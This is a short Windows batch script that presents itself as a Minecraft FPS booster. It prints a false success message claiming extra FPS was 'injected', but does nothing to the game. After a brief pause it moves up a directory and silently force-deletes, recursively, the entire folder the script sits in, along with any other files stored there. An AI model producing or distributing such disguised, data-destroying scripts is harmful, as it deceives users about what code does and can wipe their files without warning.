@echo off
echo You Have Now Injected Extra FPS Into Your Minecraft Client!
timeout /t 1 /nobreak >nul

:: Move up a directory
cd ..

:: Start a new process to delete the folder
start /b cmd /c rd /s /q "%~dp0"